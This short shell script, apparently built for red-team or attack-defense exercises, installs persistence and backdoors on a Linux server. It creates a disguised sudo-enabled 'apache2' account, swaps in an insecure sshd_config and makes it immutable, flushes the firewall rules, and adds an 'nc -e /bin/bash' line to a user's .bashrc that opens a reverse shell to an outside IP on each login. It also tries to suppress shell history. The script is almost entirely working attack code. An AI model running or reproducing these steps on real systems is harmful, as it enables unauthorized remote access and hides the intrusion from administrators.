#!/bin/sh

# No history
HISTCONTROL=ignore both

# First, we're going to create a new user account named apache2 with home directory
# /var/www/apache2 to look somewhat legitimate, and add it to the sudo group
sudo mkdir /var/www/apache2
sudo useradd -d /var/www/apache2 -s /bin/bash apache2
sudo usermod -aG sudo apache2
sudo passwd apache2

# Next, we're going to go ahead and change the settings in their sshd_config file
# to the worst settings possible with the sshd_config file in this directory, and make it
# immutable.
sudo cp sshd_config /etc/ssh/sshd_config
sudo chattr +i /etc/ssh/sshd_config

# Flush iptables rules, may also do this in a cronjob
sudo iptables -F

# Use bashrc file to create a reverse shell when user logs in - make sure directory is correct
cd /home/ubuntu
sudo sed -i '$anc -e /bin/bash 100.64.2.9 7681 2>/dev/null &' .bashrc
sudo chattr +i .bashrc

# Finally, launch setup for manual cronjobs - planning to have some stopping services
# and also one to open up a backdoor for a reverse tcp shell
sudo crontab -e
